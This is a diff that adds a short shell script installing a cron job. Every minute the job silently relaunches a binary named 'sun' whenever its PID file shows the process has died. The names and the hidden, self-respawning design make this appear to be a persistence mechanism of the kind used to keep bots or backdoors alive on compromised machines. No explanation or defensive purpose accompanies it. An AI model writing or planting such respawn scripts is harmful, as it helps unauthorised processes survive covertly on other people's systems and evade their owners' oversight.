@@ -1,0 +1,17 @@
+#!/bin/sh
+pwd > hehe.dir
+dir=$(cat hehe.dir)
+echo "* * * * * $dir/up2you >/dev/null 2>&1" > cron.d
+crontab cron.d
+crontab -l | grep up2you
+echo "#!/bin/sh
+if test -r $dir/sukses.pid; then
+pid=\$(cat $dir/sukses.pid)
+if \$(kill -CHLD \$pid >/dev/null 2>&1)
+then
+exit 0
+fi
+fi
+cd $dir
+./sun &>/dev/null" > up2you
+chmod u+x up2you
